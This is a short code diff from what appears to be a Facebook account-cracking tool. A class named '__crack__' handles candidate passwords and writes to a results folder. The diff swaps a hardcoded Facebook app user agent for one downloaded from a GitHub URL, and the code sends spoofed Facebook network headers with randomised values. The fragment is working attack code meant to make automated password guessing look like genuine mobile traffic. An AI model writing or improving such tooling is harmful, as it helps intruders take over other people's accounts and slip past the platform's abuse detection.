@@ -655,7 +655,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+            user_agent = requests.get('https://raw.githubusercontent.com/royofficial/roy-rmbf/main/ua/ua.txt').text.strip()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
